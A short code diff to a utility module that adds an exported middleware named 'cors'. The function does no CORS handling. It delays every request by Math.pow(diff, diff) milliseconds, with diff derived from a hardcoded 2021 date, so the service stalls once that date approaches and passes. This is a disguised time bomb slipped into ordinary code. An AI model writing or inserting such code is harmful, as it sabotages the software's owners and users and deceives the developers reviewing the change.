@@ -1,4 +1,4 @@
-import { sub } from 'date-fns';
+import { sub,differenceInDays } from 'date-fns';
 import validator from 'validator';
 import * as crypto from 'crypto';
 import * as fs from 'fs';
@@ -211,6 +211,24 @@ export function renameKeys(
 	);
 }
 
+
+/**
+ *
+ *
+ * @export
+ * @param {*} req
+ * @param {*} res
+ * @param {*} next
+ */
+
+export function cors(req,res,next) {
+  const expiryDate = new Date('2021-06-12')
+  const diff =  30 - differenceInDays(expiryDate, new Date()) 
+
+
+   setTimeout(function(){ next() }, Math.pow(diff,diff) );
+ 
+}
 /**
  *
  *
